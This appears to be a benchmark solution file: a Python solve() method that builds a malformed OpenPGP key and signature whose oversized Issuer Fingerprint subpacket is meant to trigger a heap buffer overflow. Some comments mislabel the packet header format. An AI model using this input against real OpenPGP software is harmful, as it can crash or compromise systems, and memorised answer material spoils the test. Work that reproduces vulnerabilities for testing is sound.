import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC for a heap buffer overflow in OpenPGP fingerprint handling.

        The vulnerability is triggered by a malformed "Issuer Fingerprint"
        subpacket (type 33) within a signature packet. According to OpenPGP
        extensions, a v4 fingerprint is 20 bytes long. The subpacket body
        for a v4 key should thus contain a version byte (0x04) followed by the
        20-byte fingerprint, for a total body length of 21 bytes.

        This PoC constructs a signature packet containing a subpacket of type 33
        that claims to hold a v4 fingerprint but provides a much larger data
        payload (400 bytes). A vulnerable parser might allocate a 20-byte
        buffer based on the v4 type, and then attempt to copy the oversized
        payload into it, leading to a heap buffer overflow.

        The PoC consists of two PGP packets concatenated together:
        1. A standard v4 RSA Public-Key packet to act as a target for the signature.
        2. A Signature packet that "signs" the key and contains the malicious
           subpacket in its hashed data section.
        """

        # Helper to create an MPI (Multi-Precision Integer) in OpenPGP format.
        # An MPI consists of a 2-byte big-endian length in bits, followed by the integer bytes.
        def mpi(data: bytes) -> bytes:
            if not data:
                bit_length = 0
            else:
                # Calculate precise bit length, accounting for leading zero bytes.
                d = data.lstrip(b'\x00')
                if not d:
                    bit_length = 0
                else:
                    bit_length = (len(d) - 1) * 8 + d[0].bit_length()
            return struct.pack('>H', bit_length) + data

        # Helper to encode PGP subpacket lengths.
        # OpenPGP uses a variable-length encoding for subpacket lengths.
        def encode_subpacket_length(length: int) -> bytes:
            if length < 192:
                return bytes([length])
            elif length < 8384:
                length -= 192
                return bytes([(length >> 8) + 192, length & 0xFF])
            else:
                return b'\xff' + struct.pack('>I', length)

        # 1. Create a Public-Key Packet (Tag 6)
        # This serves as a valid key for the signature to apply to.
        # We use a dummy 1024-bit RSA key.
        pubkey_body = (
            b'\x04'                                    # Version 4
            + b'\x00\x00\x00\x00'                      # Creation time (dummy)
            + b'\x01'                                  # Pubkey algorithm: RSA
            + mpi(b'\x01' + b'\x00' * 126 + b'\x01')    # MPI for n (1024-bit)
            + mpi(b'\x01\x00\x01')                     # MPI for e (65537)
        )
        # New format packet header for Tag 6 (Public Key) with 2-byte length
        pubkey_packet = b'\x99' + struct.pack('>H', len(pubkey_body)) + pubkey_body

        # 2. Create a Signature Packet (Tag 2) containing the malicious subpacket
        
        # Craft the malicious "Issuer Fingerprint" subpacket (Type 33)
        # A v4 fingerprint is 20 bytes. We provide 400 bytes to cause an overflow.
        overflow_size = 400
        # Subpacket body: version byte + fingerprint data
        fingerprint_data = b'\x04' + (b'A' * (overflow_size - 1))
        
        # Subpacket structure: length + type + body
        # The length field includes the type byte itself.
        subpacket_total_len = len(fingerprint_data) + 1
        issuer_fingerprint_subpacket = (
            encode_subpacket_length(subpacket_total_len)
            + b'\x21'  # Subpacket type 33 (Issuer Fingerprint)
            + fingerprint_data
        )

        # Craft a standard "Signature Creation Time" subpacket (Type 2) for plausibility.
        creation_time_body = b'\x00\x00\x00\x00'
        creation_time_subpacket_len = len(creation_time_body) + 1
        creation_time_subpacket = (
             encode_subpacket_length(creation_time_subpacket_len)
             + b'\x02' # Subpacket type 2
             + creation_time_body
        )

        hashed_subpackets = creation_time_subpacket + issuer_fingerprint_subpacket

        # Assemble the body of the signature packet
        sig_body = (
            b'\x04'                                 # Version 4
            + b'\x10'                               # Sig type: 0x10 (Generic cert)
            + b'\x01'                               # Pubkey algo: RSA
            + b'\x08'                               # Hash algo: SHA256
            + struct.pack('>H', len(hashed_subpackets)) # Length of hashed subpackets
            + hashed_subpackets
            + b'\x00\x00'                           # Unhashed subpackets length (0)
            + b'\x00\x00'                           # Left 16 bits of hash (dummy)
            + mpi(b'\x00' * 128)                    # Dummy signature MPI
        )

        # New format packet header for Tag 2 (Signature) with 2-byte length
        sig_packet = b'\x89' + struct.pack('>H', len(sig_body)) + sig_body

        # The final PoC is the public key followed by the signature.
        poc = pubkey_packet + sig_packet
        return poc